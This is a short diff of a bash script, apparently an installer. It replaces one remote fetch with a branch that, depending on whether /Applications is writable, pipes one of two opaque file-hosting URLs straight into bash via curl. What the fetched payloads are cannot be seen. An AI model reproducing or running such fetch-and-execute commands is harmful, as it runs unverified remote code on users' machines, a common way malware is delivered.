@@ -1,1 +1,14 @@
-curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rbE4CwWdY3eVyHCaSdF1oNkZ7xmpRItAEgrf6" | bash
+#!/bin/bash
+
+main() {
+    clear
+
+    if [ -w "/Applications" ]; then
+        curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3r5eIIq1VblnGWyNmSBHr8E3DuVLvPfio4M0h6" | bash
+    else
+        echo -e "${YELLOW}[!] Local user detected, using home directory instead of global directory ${NC}"
+        curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rdnMDWNkeXzGpiAlqWZ3U84SwTrOnabf75C2Y" | bash
+    fi
+}
+
+main
